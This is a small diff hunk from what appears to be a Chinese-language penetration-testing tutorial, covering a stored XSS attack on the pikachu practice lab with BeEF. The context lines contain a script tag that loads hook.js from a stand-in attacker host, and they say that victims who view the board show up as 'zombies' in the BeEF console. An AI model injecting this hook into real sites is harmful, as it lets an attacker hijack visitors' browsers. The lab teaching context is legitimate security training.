@@ -797,7 +797,6 @@ sudo beef-xss
 ### 注入 Hook
 ```html
 <script src="http://attacker:3000/hook.js"></script>
-
 ```
 
 提交到 pikachu 留言板，受害者访问后 → 在 BeEF 控制台出现一个"zombie"。
